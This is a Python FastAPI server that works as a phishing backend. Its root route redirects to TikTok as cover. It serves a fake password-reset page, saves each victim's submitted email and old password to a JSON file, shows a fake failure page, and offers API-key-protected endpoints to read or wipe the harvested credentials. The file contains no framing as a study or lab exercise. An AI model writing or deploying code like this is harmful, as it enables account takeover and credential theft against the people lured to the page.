import os

from fastapi import FastAPI, Form, Header, HTTPException
from fastapi.responses import HTMLResponse, RedirectResponse
import json
from dotenv import load_dotenv


load_dotenv()

app = FastAPI()


@app.get("/", response_class=HTMLResponse)
async def root():
    return RedirectResponse(url="https://www.tiktok.com/")


@app.get("/reset-password", response_class=HTMLResponse)
async def reset_password():
    with open("index.html", "r") as f:
        return f.read()


@app.get("/reset-failed", response_class=HTMLResponse)
async def reset_failed():
    with open("reset-failed.html", "r") as f:
        return f.read()


@app.post("/submit-form")
async def submit_form(email: str = Form(...), old_password: str = Form(...)):
    with open("details.json", "r") as f:
        data = json.load(f)
    data.append({"email": email, "old_password": old_password})
    with open("details.json", "w") as f:
        json.dump(data, f, indent=2)

    # After submit, always go to a logical ROUTE
    return RedirectResponse(url="/reset-failed", status_code=303)


@app.get("/read")
async def read_details(x_api_key: str = Header(...)):
    if x_api_key != os.getenv("MY_API_KEY"):
        raise HTTPException(
            status_code=401,
            detail=f"Unauthorized: Invalid API Key.",
        )

    with open("details.json", "r") as f:
        return json.load(f)


@app.get("/clear-json")
async def read_details(x_api_key: str = Header(...)):
    if x_api_key != os.getenv("MY_API_KEY"):
        raise HTTPException(
            status_code=401,
            detail=f"Unauthorized: Invalid API Key.",
        )

    with open("details.json", "w") as f:
        f.write("")

    return {"status": 200}
